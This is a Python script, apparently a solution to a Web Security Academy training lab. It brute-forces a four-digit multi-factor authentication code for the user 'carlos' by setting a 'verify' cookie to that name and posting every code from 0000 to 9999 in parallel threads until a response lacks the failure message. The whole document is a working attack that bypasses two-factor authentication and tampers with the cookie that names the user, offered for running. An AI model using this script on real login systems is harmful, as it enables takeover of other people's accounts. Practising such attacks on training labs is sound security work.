import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "https://0af7001304ce360184d71e080082006d.web-security-academy.net/login2"

def try_code(code):
    session = requests.Session()
    session.cookies.set("verify", "carlos")

    response = session.post(
        url,
        data={"mfa-code": f"{code:04d}"},
        timeout=10
    )

    if "Incorrect security code" not in response.text:
        return code, response.status_code, len(response.text)

    return None


print("Starting attack...")

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(try_code, code) for code in range(10000)]

    for future in as_completed(futures):
        result = future.result()

        if result:
            print(f"Potential success: {result}")
            executor.shutdown(wait=False, cancel_futures=True)
            break

print("Finished.")